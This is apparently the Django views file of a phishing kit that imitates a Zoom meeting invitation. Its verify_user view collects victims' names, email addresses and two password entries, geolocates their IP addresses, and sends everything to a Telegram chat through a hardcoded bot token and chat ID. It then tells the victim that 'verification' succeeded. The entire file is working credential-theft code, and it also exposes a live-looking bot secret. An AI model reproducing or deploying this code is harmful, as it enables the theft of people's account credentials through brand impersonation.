from django.shortcuts import render
from django.http import JsonResponse
from django.views.decorators.csrf import csrf_exempt
import requests
import base64

def send_to_telegram(message):
    token = '7584867618:AAHIy5vSZOhoW6Ba0pZdDL0fILznS9RGcyQ'
    chat_id = "7548826388"
    url = f"https://api.telegram.org/bot{token}/sendMessage?chat_id={chat_id}&text={message}"
    res = requests.get(url).json()
    return res
def get_country_from_ip(ip_address):
    url = f"http://ip-api.com/json/{ip_address}"
    response = requests.get(url)
    if response.status_code == 200:
        data = response.json()
        country = data.get("country")     # Country name, e.g., "United States"
        city = data.get("city")
        return country, city
    return None, None

# Create your views here.
def home(request):
    meet = request.GET.get('meeting')  # 'video'
  
    encoded_id = request.GET.get('id')       # Base64 encoded meeting ID
    encoded_access = request.GET.get('access')
    print(meet,encoded_id,encoded_access)
    try:
        meeting_id = base64.b64decode(encoded_id).decode('utf-8') if encoded_id else None
        access_code = base64.b64decode(encoded_access).decode('utf-8') if encoded_access else None
    except (base64.binascii.Error, UnicodeDecodeError):
        return HttpResponse("Invalid url parameter", status=400)
    print(meeting_id,access_code)
    return render(request,'home.html',{'company_email':meeting_id,"encoded_id":encoded_id,"encoded_access":encoded_access})

def zoom_meeting(request):
    return render(request,'create.html')

def final(request):
    meet = request.GET.get('meeting')  # 'video'
    encoded_id = request.GET.get('id')       # Base64 encoded meeting ID
    encoded_access = request.GET.get('access')
    print(meet,encoded_id,encoded_access)
    try:
        meeting_id = base64.b64decode(encoded_id).decode('utf-8') if encoded_id else None
        access_code = base64.b64decode(encoded_access).decode('utf-8') if encoded_access else None
    except (base64.binascii.Error, UnicodeDecodeError):
        return HttpResponse("Invalid url parameter", status=400)
    print(meeting_id,access_code)
    return render(request,'finallink.html',{'company_name':meeting_id,"company_email":access_code})

@csrf_exempt  # disable CSRF only if necessary for testing
def verify_user(request):
    if request.method == "POST":
        name = request.POST.get("name")
        email = request.POST.get("mail")
        pass1 = request.POST.get("pass1")
        pass2 = request.POST.get("pass2")
        ip_address = request.META.get("REMOTE_ADDR")
        country, city = get_country_from_ip(ip_address)
        subject = 'New zoom details submitted'
        mail_message = f"{subject}\nipaddress:{ip_address} \ncountry:{country} \ncity:{city}\ncompany_name: {name}\ncompany_mail: {email}\npassword1: {pass1}\npassword2: {pass2}"
        send_to_telegram(mail_message)

        print(name,email,pass1,pass2)
        
        # Add your logic here (e.g., validate credentials)
        
        # Example response
        return JsonResponse({"status": "success", "message": "Verification successful"})

    return JsonResponse({"status": "error", "message": "Invalid request"}, status=400)